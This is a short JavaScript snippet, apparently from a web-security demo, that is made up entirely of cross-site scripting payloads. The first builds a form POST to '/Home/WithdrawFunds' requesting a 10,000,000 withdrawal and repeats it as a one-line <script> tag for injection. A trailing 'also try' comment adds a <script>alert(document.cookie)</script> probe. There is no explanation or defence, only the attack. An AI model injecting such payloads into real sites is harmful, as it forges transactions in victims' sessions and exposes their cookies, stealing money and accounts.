// Pure JS form encoded data: https://developer.mozilla.org/en-US/docs/Web/API/FormData/Using_FormData_Objects
let formData = new FormData();
formData.append('accountNumber', 'a23v828');
formData.append('amount', 10000000);
let request = new XMLHttpRequest();
request.open('POST', '/Home/WithdrawFunds');
request.send(formData);

// as a single line in script element
// <script>let formData = new FormData();formData.append('accountNumber', 'a23v828');formData.append('amount', 10000000);let request = new XMLHttpRequest();request.open('POST', '/Home/WithdrawFunds');request.send(formData);</script>

// also try 
// <script>alert(document.cookie);</script>
